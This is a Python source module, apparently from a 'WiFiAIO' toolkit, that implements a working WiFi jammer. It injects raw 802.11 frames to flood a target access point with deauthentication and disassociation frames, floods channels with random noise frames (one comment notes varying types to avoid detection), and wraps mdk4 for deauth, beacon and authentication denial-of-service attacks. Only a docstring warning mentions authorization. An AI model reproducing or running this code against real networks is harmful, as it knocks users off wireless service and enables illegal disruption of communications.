"""
WiFiAIO Jammer Module

WiFi jamming capabilities: channel jamming, deauth jamming, and noise generation.
"""

import os
import struct
import time
import random
import logging
import subprocess
import threading
from typing import List, Dict, Optional, Any, Callable
from dataclasses import dataclass, field
from enum import Enum

from wifi_aio.exceptions import (
    WiFiConnectionError,
    WiFiPermissionError,
    WiFiTimeoutError,
    JammerError,
)

logger = logging.getLogger(__name__)


class JammerMode(Enum):
    """Jamming modes."""
    CHANNEL = "channel"
    DEAUTH = "deauth"
    NOISE = "noise"


@dataclass
class JammerStats:
    """Jamming statistics."""
    packets_sent: int = 0
    packets_failed: int = 0
    start_time: float = 0.0
    end_time: float = 0.0
    mode: str = ""
    target: str = ""
    rate_per_second: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "packets_sent": self.packets_sent,
            "packets_failed": self.packets_failed,
            "mode": self.mode,
            "target": self.target,
            "duration": self.end_time - self.start_time if self.end_time else 0,
            "rate_per_second": self.rate_per_second,
        }


class Jammer:
    """
    WiFi jammer supporting channel, deauth, and noise jamming modes.

    WARNING: This module is for authorized security testing only.
    Jamming WiFi networks is illegal in most jurisdictions without
    explicit authorization.
    """

    def __init__(self, interface: str = "wlan0mon"):
        """
        Initialize Jammer.

        Args:
            interface: Monitor mode interface for injection.
        """
        self.interface = interface
        self._running = False
        self._stats = JammerStats()
        self._socket = None
        self._lock = threading.Lock()

    def _check_root(self) -> None:
        """Verify running as root."""
        if os.geteuid() != 0:
            raise WiFiPermissionError("Jamming requires root privileges")

    def _mac_to_bytes(self, mac: str) -> bytes:
        """Convert MAC address string to bytes."""
        return bytes(int(b, 16) for b in mac.split(":"))

    def _open_socket(self) -> None:
        """Open raw socket for frame injection."""
        import socket
        try:
            self._socket = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)
            )
            self._socket.bind((self.interface, 0))
        except OSError as e:
            raise JammerError(f"Failed to open raw socket: {e}")

    def _close_socket(self) -> None:
        """Close raw socket."""
        if self._socket:
            try:
                self._socket.close()
            except OSError:
                pass
            self._socket = None

    def _build_radiotap_header(self) -> bytes:
        """Build radiotap header for injection."""
        return struct.pack(
            "<BBHI BB x",
            0x00,   # version
            0x00,   # pad
            13,     # header length
            0x00000804,  # present flags (TX flags + Rate)
            0x02,   # TX rate: 1 Mbps
            0x08,   # TX flags: no ACK
        )

    def _inject_frame(self, frame: bytes) -> bool:
        """Inject a raw frame via the socket."""
        if not self._socket:
            self._open_socket()

        radiotap = self._build_radiotap_header()
        full_frame = radiotap + frame

        try:
            bytes_sent = self._socket.send(full_frame)
            if bytes_sent > 0:
                with self._lock:
                    self._stats.packets_sent += 1
                return True
            else:
                with self._lock:
                    self._stats.packets_failed += 1
                return False
        except OSError as e:
            with self._lock:
                self._stats.packets_failed += 1
            logger.error("Injection error: %s", e)
            return False

    def _craft_deauth_frame(self, bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                             reason_code: int = 7, seq: int = 0) -> bytes:
        """Craft a deauthentication frame."""
        frame_control = struct.pack("<H", 0x00C0)  # Deauth
        duration = struct.pack("<H", 0x0000)
        seq_ctrl = struct.pack("<H", seq << 4)

        bssid_bytes = self._mac_to_bytes(bssid)
        client_bytes = self._mac_to_bytes(client_mac)

        if client_mac.upper() == "FF:FF:FF:FF:FF:FF":
            addr1 = client_bytes
            addr2 = bssid_bytes
        else:
            addr1 = client_bytes
            addr2 = bssid_bytes
        addr3 = bssid_bytes

        reason = struct.pack("<H", reason_code)

        return frame_control + duration + addr1 + addr2 + addr3 + seq_ctrl + reason

    def _craft_disassoc_frame(self, bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                               reason_code: int = 8, seq: int = 0) -> bytes:
        """Craft a disassociation frame."""
        frame_control = struct.pack("<H", 0x00A0)  # Disassociation
        duration = struct.pack("<H", 0x0000)
        seq_ctrl = struct.pack("<H", seq << 4)

        bssid_bytes = self._mac_to_bytes(bssid)
        client_bytes = self._mac_to_bytes(client_mac)

        addr1 = client_bytes if client_mac.upper() == "FF:FF:FF:FF:FF:FF" else client_bytes
        addr2 = bssid_bytes
        addr3 = bssid_bytes

        reason = struct.pack("<H", reason_code)

        return frame_control + duration + addr1 + addr2 + addr3 + seq_ctrl + reason

    def _craft_noise_frame(self, size: int = 128, frame_type: int = 0x0080) -> bytes:
        """
        Craft a noise/junk frame.

        Generates a frame with random content to flood the channel.

        Args:
            size: Frame size in bytes.
            frame_type: 802.11 frame type value.

        Returns:
            Random noise frame bytes.
        """
        # Random frame control
        fc = struct.pack("<H", frame_type)
        duration = struct.pack("<H", random.randint(0, 0xFFFF))

        # Random addresses
        addr1 = os.urandom(6)
        addr2 = os.urandom(6)
        addr3 = os.urandom(6)
        seq_ctrl = struct.pack("<H", random.randint(0, 0xFFFF))

        # Random body
        header_size = 2 + 2 + 6 + 6 + 6 + 2  # 24 bytes
        body_size = max(0, size - header_size)
        body = os.urandom(body_size)

        return fc + duration + addr1 + addr2 + addr3 + seq_ctrl + body

    def channel_jam(self, channel: int, duration: float = 30.0,
                    rate: float = 100.0, frame_size: int = 128,
                    callback: Optional[Callable] = None) -> JammerStats:
        """
        Jam a specific WiFi channel by flooding it with noise frames.

        Args:
            channel: Channel number to jam.
            duration: Jam duration in seconds (0 = until stop()).
            rate: Injection rate in packets per second.
            frame_size: Size of noise frames in bytes.
            callback: Optional callback with stats.

        Returns:
            JammerStats with jamming statistics.
        """
        self._check_root()
        self._running = True
        self._stats = JammerStats(
            start_time=time.time(),
            mode=JammerMode.CHANNEL.value,
            target=f"channel-{channel}",
        )

        # Set channel
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                check=True, capture_output=True, timeout=10
            )
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
            raise JammerError(f"Failed to set channel {channel}: {e}")

        delay = 1.0 / rate if rate > 0 else 0.0

        try:
            self._open_socket()
            seq = 0

            while self._running:
                # Alternate between different frame types for maximum disruption
                frame_types = [0x0080, 0x00C0, 0x00A0, 0x00D0, 0x0040]
                frame_type = frame_types[seq % len(frame_types)]

                noise_frame = self._craft_noise_frame(frame_size, frame_type)
                self._inject_frame(noise_frame)

                if callback:
                    callback(self._stats)

                if duration > 0:
                    elapsed = time.time() - self._stats.start_time
                    if elapsed >= duration:
                        break

                seq += 1
                if delay > 0:
                    time.sleep(delay)

        finally:
            self._close_socket()
            self._running = False

        self._stats.end_time = time.time()
        elapsed = self._stats.end_time - self._stats.start_time
        self._stats.rate_per_second = self._stats.packets_sent / elapsed if elapsed > 0 else 0
        return self._stats

    def deauth_jam(self, bssid: str, channel: int,
                   client_mac: str = "FF:FF:FF:FF:FF:FF",
                   duration: float = 30.0,
                   rate: float = 50.0,
                   include_disassoc: bool = True,
                   callback: Optional[Callable] = None) -> JammerStats:
        """
        Jam by flooding a target AP with deauth/disassociation frames.

        Args:
            bssid: Target AP BSSID.
            channel: Target channel.
            client_mac: Target client or broadcast.
            duration: Jam duration in seconds.
            rate: Injection rate in packets per second.
            include_disassoc: Also send disassociation frames.
            callback: Optional callback with stats.

        Returns:
            JammerStats with jamming statistics.
        """
        self._check_root()
        self._running = True
        self._stats = JammerStats(
            start_time=time.time(),
            mode=JammerMode.DEAUTH.value,
            target=bssid,
        )

        # Set channel
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                check=True, capture_output=True, timeout=10
            )
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
            raise JammerError(f"Failed to set channel {channel}: {e}")

        delay = 1.0 / rate if rate > 0 else 0.0

        try:
            self._open_socket()
            seq = 0

            while self._running:
                # Alternate deauth and disassoc for maximum effect
                if include_disassoc and seq % 2 == 1:
                    frame = self._craft_disassoc_frame(bssid, client_mac, seq=seq & 0xFFF)
                else:
                    frame = self._craft_deauth_frame(bssid, client_mac, seq=seq & 0xFFF)

                self._inject_frame(frame)

                if callback:
                    callback(self._stats)

                if duration > 0:
                    elapsed = time.time() - self._stats.start_time
                    if elapsed >= duration:
                        break

                seq += 1
                if delay > 0:
                    time.sleep(delay)

        finally:
            self._close_socket()
            self._running = False

        self._stats.end_time = time.time()
        elapsed = self._stats.end_time - self._stats.start_time
        self._stats.rate_per_second = self._stats.packets_sent / elapsed if elapsed > 0 else 0
        return self._stats

    def noise_jam(self, channel: int, duration: float = 30.0,
                  rate: float = 200.0, bandwidth: str = "20",
                  callback: Optional[Callable] = None) -> JammerStats:
        """
        Generate noise on a channel using raw packet flooding.

        This creates random 802.11 frames at high rate to disrupt
        communications on the target channel.

        Args:
            channel: Channel to jam.
            duration: Jam duration in seconds.
            rate: Injection rate in packets per second.
            bandwidth: Channel bandwidth ("20" or "40").
            callback: Optional callback with stats.

        Returns:
            JammerStats with jamming statistics.
        """
        self._check_root()
        self._running = True
        self._stats = JammerStats(
            start_time=time.time(),
            mode=JammerMode.NOISE.value,
            target=f"channel-{channel}",
        )

        # Set channel
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel),
                 bandwidth.lower() + "mhz"],
                check=True, capture_output=True, timeout=10
            )
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
            # Try without bandwidth specification
            try:
                subprocess.run(
                    ["iw", "dev", self.interface, "set", "channel", str(channel)],
                    check=True, capture_output=True, timeout=10
                )
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                raise JammerError(f"Failed to set channel {channel}: {e}")

        delay = 1.0 / rate if rate > 0 else 0.0

        try:
            self._open_socket()

            while self._running:
                # Generate various noise frame sizes for maximum disruption
                frame_size = random.randint(64, 256)

                # Use different frame types to avoid detection as simple deauth flood
                noise_frame = self._craft_noise_frame(
                    frame_size,
                    frame_type=random.choice([0x0008, 0x0020, 0x0040, 0x0080,
                                             0x00D0, 0x00C8])
                )
                self._inject_frame(noise_frame)

                if callback:
                    callback(self._stats)

                if duration > 0:
                    elapsed = time.time() - self._stats.start_time
                    if elapsed >= duration:
                        break

                if delay > 0:
                    time.sleep(delay)

        finally:
            self._close_socket()
            self._running = False

        self._stats.end_time = time.time()
        elapsed = self._stats.end_time - self._stats.start_time
        self._stats.rate_per_second = self._stats.packets_sent / elapsed if elapsed > 0 else 0
        return self._stats

    def jam_via_mdk4(self, channel: int, mode: str = "d",
                     speed: int = 100, duration: float = 30.0,
                     target_file: Optional[str] = None) -> JammerStats:
        """
        Jam using mdk4 tool.

        Args:
            channel: Channel to jam.
            mode: mdk4 attack mode ('d' = deauth, 'b' = beacon flood,
                  'e' = EAPOL start flood, 'a' = authentication DoS).
            speed: Injection speed.
            duration: Duration in seconds.
            target_file: File with target BSSIDs.

        Returns:
            JammerStats with jamming statistics.
        """
        self._check_root()
        self._stats = JammerStats(
            start_time=time.time(),
            mode=f"mdk4-{mode}",
            target=f"channel-{channel}",
        )

        cmd = [
            "mdk4",
            self.interface,
            mode,
            "-s", str(speed),
            "-c", str(channel),
        ]

        if target_file and os.path.isfile(target_file):
            cmd.extend(["-b", target_file])

        self._running = True
        try:
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )

            while self._running:
                if process.poll() is not None:
                    break

                elapsed = time.time() - self._stats.start_time
                if duration > 0 and elapsed >= duration:
                    break

                time.sleep(1)

            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()

        except FileNotFoundError:
            raise JammerError("mdk4 not found. Install mdk4 package.")
        finally:
            self._running = False

        # Estimate packets sent based on rate and duration
        actual_duration = time.time() - self._stats.start_time
        self._stats.packets_sent = int(speed * actual_duration)
        self._stats.end_time = time.time()
        self._stats.rate_per_second = speed

        return self._stats

    def stop(self) -> None:
        """Stop all jamming activities."""
        self._running = False
        self._close_socket()
        logger.info("Jammer stopped")

    def is_running(self) -> bool:
        """Check if jamming is active."""
        return self._running

    def get_stats(self) -> JammerStats:
        """Get current jamming statistics."""
        return self._stats
